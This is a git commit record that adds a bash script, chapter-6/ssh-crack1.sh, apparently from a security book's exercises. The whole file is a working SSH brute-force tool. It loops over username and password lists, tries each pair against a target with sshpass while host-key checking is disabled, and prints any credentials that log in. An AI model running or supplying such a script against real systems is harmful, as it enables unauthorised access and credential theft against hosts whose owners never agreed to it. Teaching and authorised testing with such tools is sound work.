aa9c533ad377bd63dfb1c8f55ddb3bf69316791b
donniet4 <55449545+donniet4@users.noreply.github.com>
2025-08-10 14:32:03 -0400

    Add files via upload

--- chapter-6/ssh-crack1.sh
+++ chapter-6/ssh-crack1.sh
@@ -1,1 +1,25 @@
+#!/bin/bash
 
+target="${1}"
+port="${2}"
+usernames=( $(cat "${3}") )
+passwords=( $(cat "${4}") )
+
+if [[ "$#" -ne 4 ]] ; then
+	echo "Usage:  ./ssh-crack.sh target port username_list password_list"
+fi
+
+
+for user in "${usernames[@]}"; do
+	for password in "${passwords[@]}"; do
+		if sshpass -p"${password}" ssh1 -o "StrictHostKeyChecking=no" -p "${port}" "${user}"@"${target}" exit > /dev/null 2>&1; then
+			echo "Successful login."
+			echo "Host: ${target}"
+			echo "Username: ${user}"
+			echo "Password: ${password}"
+			exit 0
+		else
+			echo "No login for ${user} and ${password} on  ${target}"
+		fi
+	done
+done
